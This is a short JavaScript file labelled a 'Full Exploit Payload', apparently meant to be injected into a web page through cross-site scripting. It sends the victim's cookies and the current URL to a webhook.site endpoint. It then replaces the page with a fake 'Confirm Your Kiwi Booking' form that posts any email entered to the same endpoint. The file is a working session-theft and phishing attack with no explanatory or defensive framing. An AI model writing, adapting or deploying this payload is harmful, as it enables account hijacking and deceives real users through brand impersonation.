// x.js - Full Exploit Payload

// 1. Exfiltrate sensitive data
fetch('https://webhook.site/027e6929-e4a9-40c5-9076-abe148240e6c?cookie=' + encodeURIComponent(document.cookie) + '&url=' + encodeURIComponent(location.href));

// 2. Replace DOM with a fake booking confirmation
document.body.innerHTML = `
  <style>
    body {
      font-family: sans-serif;
      background: #f9f9f9;
      padding: 30px;
      text-align: center;
    }
    input, button {
      padding: 12px;
      font-size: 16px;
      width: 280px;
      margin-top: 10px;
    }
    button {
      background: #00a991;
      color: white;
      border: none;
      cursor: pointer;
    }
  </style>
  <h2>🛫 Confirm Your Kiwi Booking</h2>
  <p>We just need to confirm your email to finalize your booking.</p>
  <input id="e" type="email" placeholder="Enter your email" />
  <br>
  <button onclick="fetch('https://webhook.site/027e6929-e4a9-40c5-9076-abe148240e6c?email='+encodeURIComponent(e.value))">Confirm</button>
`;
